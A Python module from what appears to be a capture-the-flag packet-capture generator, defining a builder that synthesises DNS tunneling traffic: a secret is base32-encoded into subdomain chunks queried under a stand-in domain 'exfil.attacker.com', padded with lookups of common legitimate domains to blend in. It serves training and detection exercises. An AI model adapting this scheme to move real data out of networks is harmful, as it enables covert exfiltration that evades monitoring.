"""DNS tunneling builder for covert data exfiltration via DNS queries.

Generates realistic DNS tunnel traffic: base32-encoded data chunks are
embedded as subdomain labels in DNS queries to an attacker-controlled
domain. Each chunk is sent as a separate DNS query/response pair.

Uses DNSQueryHelper for packet crafting. Data can be reassembled by
collecting subdomain labels, sorting by index, concatenating, re-padding,
and base32 decoding.

No Flask imports allowed in engine modules.
"""

import base64
import random
from collections.abc import Callable, Iterator
from typing import Any

from ctf_pcaps.engine.builders.base import BaseBuilder
from ctf_pcaps.engine.protocols.dns_query import DNSQueryHelper
from ctf_pcaps.engine.registry import register_builder

# Legitimate domains used for padding queries when tunnel chunks are few
PADDING_DOMAINS = [
    "www.google.com",
    "cdn.cloudflare.com",
    "api.github.com",
    "fonts.googleapis.com",
    "ajax.aspnetcdn.com",
    "cdn.jsdelivr.net",
    "code.jquery.com",
    "static.cloudflareinsights.com",
    "www.gstatic.com",
    "ssl.gstatic.com",
    "update.googleapis.com",
    "accounts.google.com",
]


def _random_rfc1918_ip() -> str:
    """Generate a random RFC 1918 private IP address (10.x.x.x)."""
    return (
        f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    )


@register_builder("dns_tunnel", version=1)
class DnsTunnelBuilder(BaseBuilder):
    """Builder that generates DNS tunneling data exfiltration traffic.

    Encodes a secret message as base32 chunks in DNS subdomain labels.
    Each chunk becomes a query like: ``<chunk>.<index>.<tunnel_domain>``.

    Parameters:
    - dns_server: DNS server IP (default: "8.8.8.8")
    - tunnel_domain: Attacker domain (default: "exfil.attacker.com")
    - secret_message: Data to exfiltrate (default: see below)
    - chunk_size: Characters per label (default: 50, max: 50)
    - answer_ip: Fake response IP (default: "10.255.0.1")
    """

    def build(
        self,
        params: dict,
        steps: list[dict],
        callback: Callable[[int], None] | None = None,
    ) -> Iterator[Any]:
        """Generate DNS tunnel packets with base32-encoded subdomains.

        Yields DNS query/response pairs. If total tunnel queries are
        fewer than 15, pads with legitimate-looking DNS queries to
        reach the minimum range.
        """
        dns_server = params.get("dns_server", "8.8.8.8")
        tunnel_domain = params.get("tunnel_domain", "exfil.attacker.com")
        secret_message = params.get("secret_message", "confidential_project_data_2026")
        chunk_size = min(params.get("chunk_size", 50), 50)
        answer_ip = params.get("answer_ip", "10.255.0.1")

        client_ip = _random_rfc1918_ip()
        helper = DNSQueryHelper(src_ip=client_ip, dst_ip=dns_server)

        # Encode the secret message as base32 without padding
        encoded = base64.b32encode(secret_message.encode()).decode().rstrip("=").lower()

        # Split into chunks
        chunks = [
            encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)
        ]

        count = 0
        tunnel_query_count = len(chunks)

        # Yield tunnel query/response pairs
        for index, chunk in enumerate(chunks):
            domain = f"{chunk}.{index}.{tunnel_domain}"
            query_pkt = helper.query(domain)
            count += 1
            if callback:
                callback(count)
            yield query_pkt

            resp_pkt = helper.response(query_pkt, answer_ip)
            count += 1
            if callback:
                callback(count)
            yield resp_pkt

        # Pad with legitimate DNS queries if below minimum of 15
        if tunnel_query_count < 15:
            padding_needed = 15 - tunnel_query_count
            padding_domains = random.sample(
                PADDING_DOMAINS,
                min(padding_needed, len(PADDING_DOMAINS)),
            )
            # If we need more than available domains, cycle
            while len(padding_domains) < padding_needed:
                padding_domains.append(random.choice(PADDING_DOMAINS))

            for pad_domain in padding_domains:
                query_pkt = helper.query(pad_domain)
                count += 1
                if callback:
                    callback(count)
                yield query_pkt

                # Use a common DNS resolver IP for responses
                pad_ip = f"142.250.{random.randint(0, 255)}.{random.randint(1, 254)}"
                resp_pkt = helper.response(query_pkt, pad_ip)
                count += 1
                if callback:
                    callback(count)
                yield resp_pkt
